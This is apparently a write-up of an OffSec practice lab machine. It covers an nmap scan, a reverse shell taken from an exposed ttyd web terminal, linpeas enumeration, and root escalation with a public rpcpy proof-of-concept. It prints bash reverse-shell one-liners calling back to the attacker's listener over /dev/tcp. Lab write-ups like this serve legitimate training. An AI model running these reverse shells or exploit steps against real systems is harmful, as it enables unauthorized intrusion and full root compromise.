`nmap -A -T4 -p- 192.168.152.210`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
8000/tcp open  http    ttyd 1.7.3-a2312cb (libwebsockets 3.2.0)
|_http-title: ttyd - Terminal
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So not much off of the initial scans but we are given a terminal web page

![](Images/Pasted%20image%2020250507203756.png)

Lets see if we can do anything with this. We can most certainly transfer files using curl or wget as they are available.

![](Images/Pasted%20image%2020250507203842.png)

We have python available so we can easily establish a standard shell. We can manually just paste a rev shell python payload or transfer it over. I will setup a listener and hopefully catch a shell.

![](Images/Pasted%20image%2020250507204058.png)

It hangs which is a good sign.

![](Images/Pasted%20image%2020250507204115.png)

We have to do this as Offsec does not count webshells. As there is no local flag I will jump straight into post exploitation enumeration. I will start off with a Linpeas scan as it will cover a lot of the bases.


Skimming through the output we have a critical potential escalation

![](Images/Pasted%20image%2020250507204644.png)

I also found pkexec has sudo SUID, so lets see where we can go with this.

![](Images/Pasted%20image%2020250507204813.png)

I've never seen this escalation path, so looking into it appears pkexec allows us to execute binaries as sudo. It looks like a pretty complex chain so lets check for other low hanging fruit before attempting that.

Checking the opt folder it appears we have a script that isn't standard.

![](Images/Pasted%20image%2020250507205501.png)

This appears like a good thing to investigate as its being run by root

![](Images/Pasted%20image%2020250507205543.png)

Unsure what the file is really doing but anything being run by root can be dangerous. Lets see if google has more information about it.

![](Images/Pasted%20image%2020250507205629.png)

After searching that I found [this](https://github.com/ehtec/rpcpy-exploit)lets download the POC and see if we can use it to get execution to a root shell. I believe I can confirm this is the proper path as the internal port is open.

![](Images/Pasted%20image%2020250507210222.png)

Lets change the command in the POC to establish a new shell.

```
bash -i >& /dev/tcp/192.168.45.244/22 0>&1
```

![](Images/Pasted%20image%2020250507211032.png)

It didn't appear to get proper execution so lets try again

```
'bash -c "bash -i >& /dev/tcp/192.168.45.244/22 0>&1"'
```

![](Images/Pasted%20image%2020250507211158.png)

Great success!

![](Images/Pasted%20image%2020250507211219.png)













